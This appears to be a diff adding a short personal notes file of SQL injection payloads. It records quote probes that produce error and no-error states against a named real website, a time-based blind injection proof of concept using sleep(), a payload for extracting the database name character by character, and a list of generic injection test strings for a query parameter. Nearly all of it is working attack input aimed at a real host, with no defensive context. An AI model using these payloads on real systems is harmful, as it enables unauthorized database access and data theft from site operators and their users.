@@ -1,0 +1,24 @@
+
+Getting two states for boolean based sql injection
+    Error - https://www.innogames.com/'
+    No error - https://www.innogames.com/''
+Crafted POC
+    https://www.innogames.com/'xor(if(now()=sysdate(),sleep(10),0))or'
+Advanced payload for data extraction
+    https://www.innogames.com/'xor(if(mid(database(),1,1)=0x41,sleep(63),0))or'
+
+'-if(1=2,'0','1')-'
+
+/?q=1
+/?q=1'
+/?q=1"
+/?q=[1]
+/?q[]=1
+/?q=1`
+/?q=1\
+/?q=1/*'*/
+/?q=1/*!1111'*/
+/?q=1'||'asd'||'  <== concat string
+/?q=1' or '1'='1
+/?q=1 or 1=1
+/?q='or''='
